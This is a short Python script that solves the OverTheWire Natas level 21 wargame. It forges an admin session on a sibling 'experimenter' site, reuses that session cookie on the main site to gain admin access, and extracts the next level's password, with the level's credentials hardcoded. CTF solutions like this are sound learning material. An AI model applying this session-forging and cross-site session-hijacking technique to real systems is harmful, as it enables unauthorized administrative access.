import requests

url = "http://natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ@natas21.natas.labs.overthewire.org"
alternate_url = "http://natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ@natas21-experimenter.natas.labs.overthewire.org?debug"
	
s = requests.Session()
r = s.post(alternate_url, data={"admin": "1", "submit":"1"})
admin_session_id = list(r.cookies.get_dict().values())[0]
r = s.get(url, cookies = {"PHPSESSID":admin_session_id})
password = r.text.split('Password: ')[1].split("</pre>")[0]

print(f"Admin session id : {admin_session_id}")
print(f"Natas22 password : {password}")